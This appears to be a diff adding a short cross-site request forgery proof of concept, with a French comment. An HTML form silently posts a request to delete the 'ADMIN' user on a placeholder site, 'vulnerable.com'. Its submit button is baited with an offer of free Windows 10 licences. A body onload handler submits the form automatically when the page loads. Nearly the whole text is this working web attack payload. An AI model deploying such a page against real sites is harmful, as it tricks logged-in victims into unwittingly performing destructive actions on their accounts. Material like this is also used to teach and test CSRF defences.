@@ -1,0 +1,11 @@
+<form action="http://vulnerable.com" 
+      method="POST">
+
+<input name="user" value="ADMIN"/>
+<input name="delete" value=1>
+<input type="submit" 
+       value="Free*Windows*10*licences*!"/>
+</form>
+
+Soit la victime click sur submit soit :
+<body onload="document.forms[0].submit()">
